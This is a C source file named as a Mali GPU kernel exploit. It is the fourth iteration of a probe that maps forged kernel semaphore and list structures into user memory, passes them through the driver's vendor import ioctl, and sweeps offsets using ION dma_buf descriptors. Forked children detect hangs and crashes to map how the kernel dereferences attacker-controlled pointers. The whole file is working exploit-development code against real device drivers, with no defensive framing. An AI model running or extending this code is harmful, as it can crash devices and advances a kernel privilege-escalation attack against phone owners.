/*
 * mali_exploit4.c — Deep probing of Mali vendor dispatch import path
 *
 * We know:
 * - phandle is treated as a pointer to a struct with a semaphore at offset 0
 * - Mapped memory at phandle lets kernel take semaphore and return result=3
 * - Need to figure out what data makes the import proceed deeper
 *
 * Tests:
 * 1. Confirm semaphore offset by using count=0 (should hang, not crash)
 * 2. Try all import types (0-4) with valid semaphore
 * 3. Place real dma_buf fd at every offset, try each
 * 4. Place real ION handle at every offset
 * 5. Try wrapping a real kbase allocation
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAP_ADDR  0x40000000
#define MAP_SIZE  0x10000

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

/* ARM32 ION struct */
struct ion_alloc_arm32 {
    uint32_t len;       /* 0 */
    uint32_t align;     /* 4 */
    uint32_t heap_mask; /* 8 */
    uint32_t flags;     /* 12 */
    int32_t  handle;    /* 16 */
};

struct ion_fd_arm32 {
    int32_t handle;  /* 0 */
    int32_t fd;      /* 4 */
};

static int ion_alloc_fd(int *out_handle, int *out_fd) {
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) return -1;

    struct ion_alloc_arm32 alloc = {0};
    alloc.len = 4096;
    alloc.align = 4096;
    alloc.heap_mask = 1;  /* system heap */
    alloc.flags = 0;

    if (ioctl(ion_fd, 0xc0144900, &alloc) < 0) {
        close(ion_fd);
        return -1;
    }
    *out_handle = alloc.handle;

    struct ion_fd_arm32 share = {0};
    share.handle = alloc.handle;
    if (ioctl(ion_fd, 0xc0084907, &share) < 0) {
        close(ion_fd);
        return -1;
    }
    *out_fd = share.fd;
    return ion_fd;
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/* Put a valid semaphore at *addr */
static void write_semaphore(uint32_t *ptr, uint32_t addr, uint32_t count) {
    ptr[0] = 0;              /* spinlock (unlocked) */
    ptr[1] = count;           /* semaphore count */
    ptr[2] = addr + 8;        /* wait_list.next → self */
    ptr[3] = addr + 8;        /* wait_list.prev → self */
}

static void fill_with_valid_sems(void *base_ptr, uint32_t base_addr, size_t size) {
    /* Fill with 0x00010001 base (unlocked spinlock + nonzero count) */
    uint32_t *p = (uint32_t *)base_ptr;
    for (size_t i = 0; i < size/4; i++)
        p[i] = 0x00010001;
    /* Write proper semaphores at 16-byte boundaries */
    for (size_t off = 0; off < size; off += 16) {
        write_semaphore((uint32_t*)((char*)base_ptr + off),
                       base_addr + off, 0x7FFFFFFF);
    }
}

static void do_vendor_import(int mali_fd, uint32_t phandle, uint32_t type,
                              const char *label) {
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)phandle;
    *(uint32_t*)(buf + 16) = type;

    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  [%s] ioctl=%d errno=%d result=%u", label, r, errno, result);

    /* Check response buf for interesting data */
    int has_extra = 0;
    for (int i = 20; i < 48; i += 4) {
        uint32_t v = *(uint32_t*)(buf + i);
        if (v != 0) {
            if (!has_extra) { fprintf(stderr, " |"); has_extra = 1; }
            fprintf(stderr, " [%d]=0x%x", i, v);
        }
    }
    fprintf(stderr, "\n");
}

/* ============================================================= */
/* TEST 1: Confirm semaphore is at phandle+0                      */
/* Set count=0 → down() should block → hang (SIGALRM)           */
/* ============================================================= */
static void test1_confirm_sem_offset(void) {
    fprintf(stderr, "\n--- TEST 1: Confirm semaphore at phandle+0 ---\n");

    void *mapped = mmap((void *)MAP_ADDR, MAP_SIZE,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) { perror("mmap"); return; }

    uint32_t phandle = MAP_ADDR + 0x1000;
    uint32_t *p = (uint32_t *)((char *)mapped + 0x1000);

    /* Valid semaphore but count=0 → __down() will try to sleep */
    /* Need valid wait_list to avoid crash in list_add */
    fill_with_valid_sems(mapped, MAP_ADDR, MAP_SIZE);
    write_semaphore(p, phandle, 0);  /* count=0 at phandle */
    /* Also need valid wait_list for __down */
    /* __down does: list_add_tail(&waiter.list, &sem->wait_list) */
    /* sem->wait_list at phandle+8, must be valid list_head */
    /* Already set by write_semaphore */

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { munmap(mapped, MAP_SIZE); return; }

    fprintf(stderr, "  Calling with count=0 (should hang if sem at offset 0)...\n");
    do_vendor_import(mali_fd, phandle, 2, "count=0");
    fprintf(stderr, "  Did NOT hang — semaphore may not be at offset 0!\n");

    close(mali_fd);
    munmap(mapped, MAP_SIZE);
}

/* ============================================================= */
/* TEST 2: Try all import types                                   */
/* ============================================================= */
static void test2_all_types(void) {
    fprintf(stderr, "\n--- TEST 2: All import types ---\n");

    void *mapped = mmap((void *)MAP_ADDR, MAP_SIZE,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) return;
    fill_with_valid_sems(mapped, MAP_ADDR, MAP_SIZE);

    uint32_t phandle = MAP_ADDR + 0x1000;

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { munmap(mapped, MAP_SIZE); return; }

    for (uint32_t type = 0; type <= 5; type++) {
        char label[32];
        snprintf(label, sizeof(label), "type=%u", type);
        do_vendor_import(mali_fd, phandle, type, label);
    }

    close(mali_fd);
    munmap(mapped, MAP_SIZE);
}

/* ============================================================= */
/* TEST 3: Place real dma_buf fd at every 4-byte offset          */
/* ============================================================= */
static void test3_real_fd(void) {
    fprintf(stderr, "\n--- TEST 3: Real dma_buf fd at various offsets ---\n");

    int ion_handle, dma_fd;
    int ion_fd = ion_alloc_fd(&ion_handle, &dma_fd);
    if (ion_fd < 0) { perror("ION alloc"); return; }
    fprintf(stderr, "  ION handle=%d, dma_buf fd=%d\n", ion_handle, dma_fd);

    void *mapped = mmap((void *)MAP_ADDR, MAP_SIZE,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) { close(dma_fd); close(ion_fd); return; }

    uint32_t phandle = MAP_ADDR + 0x1000;
    uint32_t *p = (uint32_t *)((char *)mapped + 0x1000);

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { close(dma_fd); close(ion_fd); munmap(mapped, MAP_SIZE); return; }

    /* Try placing fd at each 4-byte offset from phandle */
    for (int off = 0; off < 64; off += 4) {
        /* Reset pattern */
        fill_with_valid_sems(mapped, MAP_ADDR, MAP_SIZE);

        /* Place real fd at this offset */
        p[off/4] = (uint32_t)dma_fd;

        char label[32];
        snprintf(label, sizeof(label), "fd@+%d", off);
        do_vendor_import(mali_fd, phandle, 2, label);
    }

    close(mali_fd);
    close(dma_fd);
    close(ion_fd);
    munmap(mapped, MAP_SIZE);
}

/* ============================================================= */
/* TEST 4: What does the standard path do with these types?      */
/* Compare vendor vs standard dispatch behavior                   */
/* ============================================================= */
static void test4_standard_vs_vendor(void) {
    fprintf(stderr, "\n--- TEST 4: Standard vs vendor dispatch ---\n");

    int ion_handle, dma_fd;
    int ion_fd = ion_alloc_fd(&ion_handle, &dma_fd);
    if (ion_fd < 0) { perror("ION alloc"); return; }
    fprintf(stderr, "  dma_buf fd=%d\n", dma_fd);

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { close(dma_fd); close(ion_fd); return; }

    /* Standard dispatch: phandle is a userspace pointer to int fd */
    uint8_t buf[48];

    /* Standard magic 'M': pass pointer to fd */
    int fd_val = dma_fd;
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&fd_val;
    *(uint32_t*)(buf + 16) = 2;  /* UMM */
    int r = ioctl(mali_fd, make_cmd_std(48), buf);
    fprintf(stderr, "  [std M, ptr->fd] ioctl=%d errno=%d result=%u\n",
            r, errno, ((struct uk_header*)buf)->id);

    /* Standard magic 'M': pass fd directly (not as pointer) */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    r = ioctl(mali_fd, make_cmd_std(48), buf);
    fprintf(stderr, "  [std M, raw fd] ioctl=%d errno=%d result=%u\n",
            r, errno, ((struct uk_header*)buf)->id);

    /* Vendor magic 0x80: pass fd directly */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  [vendor, raw fd=%d] ioctl=%d errno=%d result=%u\n",
            dma_fd, r, errno, ((struct uk_header*)buf)->id);

    close(mali_fd);
    close(dma_fd);
    close(ion_fd);
}

/* ============================================================= */
/* TEST 5: Sweep phandle offsets to find exact sem location       */
/* ============================================================= */
static void test5_sem_offset_sweep(void) {
    fprintf(stderr, "\n--- TEST 5: Find exact semaphore offset ---\n");
    fprintf(stderr, "  Testing which offset causes hang (count=0)...\n");

    /* For each candidate offset, set count=0 there and see if it hangs */
    for (int test_off = 0; test_off <= 64; test_off += 4) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            void *mapped = mmap((void *)MAP_ADDR, MAP_SIZE,
                                PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
            if (mapped == MAP_FAILED) _exit(1);
            fill_with_valid_sems(mapped, MAP_ADDR, MAP_SIZE);

            uint32_t phandle = MAP_ADDR + 0x1000;
            uint32_t *p = (uint32_t *)((char *)mapped + 0x1000);

            /* Set count=0 at this specific offset's semaphore */
            /* If sem starts at test_off, then:
             * test_off+0: spinlock
             * test_off+4: count ← set to 0
             * test_off+8: wait_list.next
             * test_off+12: wait_list.prev */
            p[test_off/4] = 0;          /* spinlock unlocked */
            p[test_off/4 + 1] = 0;      /* count = 0 → will block */
            uint32_t wl_addr = phandle + test_off + 8;
            p[test_off/4 + 2] = wl_addr; /* wait_list.next → self */
            p[test_off/4 + 3] = wl_addr; /* wait_list.prev → self */

            int mali_fd = mali_open_ctx();
            if (mali_fd < 0) _exit(1);

            /* This should hang if semaphore IS at test_off */
            uint8_t buf[48];
            memset(buf, 0, 48);
            ((struct uk_header*)buf)->id = 513;
            *(uint64_t*)(buf + 8) = (uint64_t)phandle;
            *(uint32_t*)(buf + 16) = 2;
            ioctl(mali_fd, make_cmd_vendor(48), buf);

            close(mali_fd);
            munmap(mapped, MAP_SIZE);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        const char *result;
        if (WIFSIGNALED(status) && WTERMSIG(status) == 14)
            result = "HANG (SIGALRM) ← SEM HERE!";
        else if (WIFSIGNALED(status))
            result = "CRASHED";
        else if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
            result = "returned normally";
        else
            result = "other";
        fprintf(stderr, "  offset +%d: %s\n", test_off, result);
    }
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Vendor Dispatch Deep Probe ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    if (test == 0 || test == 1) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test1_confirm_sem_offset(); _exit(0); }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) == 14)
            fprintf(stderr, "  → HUNG (SIGALRM) — semaphore IS at offset 0!\n");
        else if (WIFSIGNALED(status))
            fprintf(stderr, "  → CRASHED: signal %d\n", WTERMSIG(status));
        else
            fprintf(stderr, "  → Exited: %d\n", WEXITSTATUS(status));
    }

    if (test == 0 || test == 2) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test2_all_types(); _exit(0); }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  → Signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 3) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); test3_real_fd(); _exit(0); }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  → Signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 4) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test4_standard_vs_vendor(); _exit(0); }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  → Signal %d\n", WTERMSIG(status));
    }

    if (test == 5) {
        test5_sem_offset_sweep();
    }

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
